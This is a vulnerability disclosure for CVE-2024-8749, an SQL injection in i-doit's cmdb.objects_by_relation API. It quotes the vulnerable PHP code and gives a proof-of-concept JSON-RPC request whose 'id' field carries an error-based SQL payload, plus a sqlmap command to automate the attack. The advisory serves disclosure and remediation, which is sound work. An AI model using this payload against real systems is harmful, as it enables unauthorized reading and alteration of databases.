

# CVE-2024-8749

## Vulnerability Details:

- **CVSS Score:** 8.8 HIGH (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)

- **Affected Component:** [I-DOIT](https://www.i-doit.com)  API (cmdb.objects_by_relation.read call)

- **Vulnerability Type:** SQL Injection (SQLi)

- **Impact:** This vulnerability allows malicious actors to execute arbitrary SQL queries, potentially leading to data leakage, data manipulation, or even unauthorized access to sensitive information.

- **Exploitability:** The vulnerability can be exploited by crafting specifically malicious SQL queries (boolean-based blind, boolean-based blind and time-based blind) and submitting them through the API requests.

- **Affected Versions:** [I-DOIT](https://www.i-doit.com)  > 1.7 (all versions)

- **Details:** The parameter ``` $p_params['id']``` in ``` /var/www/html/src/classes/modules/api/model/cmdb/isys_api_model_cmdb_objects_by_relation.class.php``` is not being sanitized. This means that user-supplied input is being used directly without any form of validation or sanitization, which increases the risk of SQL injection vulnerabilities.
  
  ```php
  public function read($p_params)
    {
        // Prepare return array.
        $l_return = [];

        // Prepare filters.
        $l_raw = (bool)$p_params['raw'];
        $l_id = (isset($p_params['id'])) ? $p_params['id'] : null;
        $l_relation_type = (isset($p_params['relation_type'])) ? $p_params['relation_type'] : null;

        // Validate status
        $this->validateStatus($p_params['status']);

        // Check if relation_type is a string constant.
        if (is_string($l_relation_type) && defined($l_relation_type)) {
            $l_relation_type = constant($l_relation_type);
        }

        if ($this->useAuth) {
            isys_auth_cmdb::instance()
                ->check_rights_obj_and_category(isys_auth::VIEW, $l_id, 'C__CATG__RELATION');
        }

        if (!$l_id) {
            throw new isys_exception_api('No object id given. Specify parameter "id" in order to filter objects by relation.');
        }

        // Start looking for objects.
        $l_dao = new isys_cmdb_dao_category_g_relation($this->m_db);
        $l_data = $l_dao->get_related_objects($l_id, $l_relation_type, $p_params['status']);

        // Iterate through result set.
        while ($l_row = $l_data->get_row()) {
            // Fetch more information about the related object:
            $l_related = $this->m_dao->get_object_by_id($l_row['related'])
                ->get_row();

            $l_row['related_title'] = $l_related['isys_obj__title'];
            $l_row['related_type'] = $l_related['isys_obj_type__id'];
            $l_row['related_type_title'] = $l_related['isys_obj_type__title'];
            $l_row['related_cmdb_status_id'] = $l_related['isys_cmdb_status__id'];
            $l_row['related_cmdb_status_title'] = $l_related['isys_cmdb_status__title'];

            $l_key = $l_row['isys_obj__id'];

            if (!$l_raw) {
                $l_row = $this->format_by_mapping($this->m_mapping, $l_row);
            }

            $l_value = [
                'data'     => $l_row,
                'children' => false
            ];

            $l_return[$l_key] = $l_value;
        }

        return $l_return;
    }
  ```

  This unsanitized input is then passed to the get_related_objects function in ```/var/www/html/src/classes/modules/cmdb/dao/category/global/isys_cmdb_dao_category_g_relation_.class.php```. This function constructs and executes SQL queries using the supplied parameter without proper sanitization or parameterization.

  ```php
  public function get_related_objects($p_parent_object, $p_relation_type = null, $status = null)
    {
        $l_sql = "SELECT
            relation_object.isys_obj__id,
            relation_object.isys_obj__title,
            isys_obj_type__id,
            isys_obj_type__title,
            isys_catg_relation_list__isys_obj__id__master,
            isys_catg_relation_list__isys_obj__id__slave,
            isys_catg_relation_list__isys_obj__id,
            CASE isys_catg_relation_list__isys_obj__id__master WHEN '" . $p_parent_object . "' THEN isys_catg_relation_list__isys_obj__id__slave
            ELSE isys_catg_relation_list__isys_obj__id__master END AS related
            FROM isys_catg_relation_list
            INNER JOIN isys_obj relation_object ON relation_object.isys_obj__id = isys_catg_relation_list__isys_obj__id
            INNER JOIN isys_obj_type ON isys_obj__isys_obj_type__id = isys_obj_type__id";

        // Additional joins for requesting object statuses
        if (!empty($status)) {
            $l_sql .= " INNER JOIN isys_obj relatedObject ON relatedObject.isys_obj__id = CASE isys_catg_relation_list__isys_obj__id__master WHEN '" . $p_parent_object . "'
                                                                                          THEN isys_catg_relation_list__isys_obj__id__slave
                                                                                          ELSE isys_catg_relation_list__isys_obj__id__master END
                        INNER JOIN isys_obj parentObject ON parentObject.isys_obj__id = " . $this->convert_sql_id($p_parent_object);
        }

        $l_sql .= " WHERE (isys_catg_relation_list__isys_obj__id__master = " . $this->convert_sql_id($p_parent_object) . "
                OR isys_catg_relation_list__isys_obj__id__slave = " . $this->convert_sql_id($p_parent_object) . ")";

        if (!is_null($p_relation_type)) {
            if (is_array($p_relation_type)) {
                $l_sql .= " AND isys_catg_relation_list__isys_relation_type__id " . $this->prepare_in_condition($p_relation_type);
            } else {
                $l_sql .= " AND isys_catg_relation_list__isys_relation_type__id = " . $this->convert_sql_id($p_relation_type);
            }
        }

        // Add status condition
        if (!empty($status)) {
            $status = $this->convert_sql_id($status);

            $l_sql .= ' AND (relation_object.isys_obj__status    = ' . $status . ')';
        }

        $l_sql .= " GROUP BY related;";

        return $this->retrieve($l_sql);
    }
  ```

  - **Mitigation:** Immediate action is recommended to address this issue. Implementing input validation and parameterized queries can help mitigate the risk of SQL Injection attacks. Additionally, conducting a thorough security audit of the entire codebase is advised to identify and address any other potential vulnerabilities.

## Proof of Concept (PoC):

An attacker could craft a malicious request to exploit the vulnerability:

```HTTP Request
POST /src/jsonrpc.php HTTP/1.1
Host: 192.168.1.46
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=0st75tilh4l5t5mhefj1gvu4om
Connection: close
Content-Type: application/json
Content-Length: 207

}
  "version": "2.0",
  "method": "cmdb.objects_by_relation",
  "params": {
    "status": 2,
    "id": "62' AND EXTRACTVALUE(5216,CONCAT(0x5c,0x717a717a71,(SELECT (ELT(5216=5216,1))),0x7178767171)) AND 'owRH'='owRH",
    "raw": false,
    "apikey": "e5368jggdb4k4s44",
    "language": "en"
  },
  "id": 1
}
```

To automate these process is it possible use ```sqlmap```.

```bash
sqlmap --random-agent --level 5 --risk 3 -r id.req --banner 
```


![image](https://github.com/offensive-security-pwncat/CVE/blob/main/SQLi/img/022024.jpeg?raw=true)

## Recommendations:

- **Patch:** Develop and deploy a patch or update that addresses the SQL Injection vulnerability in the affected API endpoint.

- **Education:** Provide training and resources to developers on secure coding practices, emphasizing the importance of input validation and preventing SQL Injection vulnerabilities.
